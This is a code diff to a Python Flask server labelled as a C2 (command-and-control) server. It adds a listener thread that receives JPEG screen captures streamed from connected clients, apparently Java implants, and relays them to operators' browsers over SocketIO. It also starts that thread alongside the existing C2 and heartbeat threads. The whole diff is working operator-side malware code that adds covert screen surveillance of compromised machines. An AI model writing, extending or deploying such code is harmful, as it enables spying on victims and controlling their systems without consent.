@@ -24,6 +24,87 @@ app = Flask(__name__)
 app.config['SECRET_KEY'] = 'c2-server-secret-key-change-in-production'
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
 
+import struct
+import base64
+
+class ScreenShareServerThread(threading.Thread):
+    def __init__(self):
+        super().__init__()
+        self.daemon = True
+        
+    def run(self):
+        host = '0.0.0.0'
+        port = 5003
+        
+        screen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        screen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        screen_socket.bind((host, port))
+        screen_socket.listen(5)
+        import logging
+        logging.basicConfig(level=logging.INFO)
+        logger = logging.getLogger("ScreenShareStart")
+        logger.info(f"[*] Screen Share Server listening on {host}:{port}")
+        
+        # Wait until server_running becomes True before checking loops
+        while not server_running:
+            time.sleep(0.1)
+
+        while server_running:
+            screen_socket.settimeout(1.0)
+            try:
+                client, addr = screen_socket.accept()
+                threading.Thread(target=self.handle_client, args=(client, addr), daemon=True).start()
+            except socket.timeout:
+                continue
+            except Exception as e:
+                break
+        screen_socket.close()
+
+    def handle_client(self, client, addr):
+        import logging
+        logging.basicConfig(level=logging.INFO)
+        logger = logging.getLogger("ScreenShare")
+        logger.info(f"[*] Screen share connected from {addr[0]}:{addr[1]}")
+        client.settimeout(None) # Prevents inheriting the 1.0 timeout from listening socket
+        try:
+            while server_running:
+                def recvall(sock, n):
+                    data = bytearray()
+                    while len(data) < n:
+                        try:
+                            packet = sock.recv(n - len(data))
+                            if not packet:
+                                return None
+                            data.extend(packet)
+                        except Exception as e:
+                            logger.error(f"[!] recvall error: {e}")
+                            return None
+                    return data
+
+                # Read 4 bytes size
+                size_data = recvall(client, 4)
+                if not size_data:
+                    break
+                
+                size = struct.unpack('>I', size_data)[0]  # Java DataOutputStream writes big-endian int
+                
+                # Read 'size' bytes of jpeg data
+                jpeg_data = recvall(client, size)
+                if not jpeg_data or len(jpeg_data) != size:
+                    logger.warning("[!] Incomplete frame received")
+                    break
+
+                # Emit frame as base64 to all connected clients (can namespace or put room if wanted, using namespace='/')
+                b64_frame = base64.b64encode(jpeg_data).decode('utf-8')
+                # Commenting out the per-frame print to avoid spam, just logging connections and errors
+                # logger.info(f"[*] Emitting screen frame to web clients ({len(b64_frame)} bytes)")
+                socketio.emit('screen_frame', {'frame': b64_frame}, namespace='/')
+        except Exception as e:
+            logger.error(f"[!] Screen share client error: {e}")
+        finally:
+            logger.info(f"[*] Screen share disconnected from {addr[0]}:{addr[1]}")
+            client.close()
+
 class C2ServerThread(threading.Thread):
     """Background thread to run the C2 socket server"""
     def __init__(self):
@@ -695,6 +776,10 @@ def download_file(filename):
 # Start C2 server in background thread
 server_thread = C2ServerThread()
 server_thread.start()
+
+# Start Screen Share server in background thread
+screen_thread = ScreenShareServerThread()
+screen_thread.start()
 
 # Start heartbeat thread to monitor client health
 heartbeat_thread = HeartbeatThread()
